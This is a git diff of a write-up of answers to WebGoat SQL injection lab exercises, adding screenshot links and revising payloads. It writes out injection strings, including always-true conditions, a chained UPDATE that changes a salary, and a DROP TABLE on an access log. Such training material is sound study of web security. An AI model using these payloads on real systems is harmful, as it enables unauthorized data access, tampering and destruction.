@@ -170,12 +170,15 @@ Output: _Marketing_
 ### 9. Try it! String SQL injection
 `SELECT * FROM user_data WHERE first_name = 'John' and last_name = '' or '1' = '1'`
 
+![](pictures/WebGoat_9_SQL_injection.png)
+
 ### 10. Try it! String SQL injection
 ```
 SELECT * FROM user_data WHERE login_count = " + Login_Count + " AND userid = "  + User_ID;
 login_Count: 1
 User_id: 1 or TRUE;
 ```
+![](pictures/WebGoat_10_numeric_SQL_injection.png)
 
 ### 11. Try it! String SQL injection
 ```
@@ -183,14 +186,16 @@ SELECT * FROM employees WHERE last_name = '" + name + "' AND auth_tan = '" + aut
 Employee Name:' OR '1'='1
 Authentication TAN:' OR '1'='1`
 ```
+![](pictures/WebGoat_11_String_SQL_injection.png)
 
 ### 12. Compromsiing Integrity with Query chaining
 ```
-Employee Name: sebastien'; UPDATE employees SET salary = '85000' WHERE userid = '37648'--
-Authentication TAN:
+Employee Name: Smith'; UPDATE employees SET salary = '120000' WHERE first_name = 'John' AND last_name = 'Smith
 ```
+![](pictures/WebGoat_12_Query_chaining.png)
 
 ### 13. Compromising Availability
 ```
-Action contains: ';DROP TABLE access_log;--
+Sebastien'; DROP TABLE access_log;--
 ```
+![End](pictures/WebGoat_13.png)
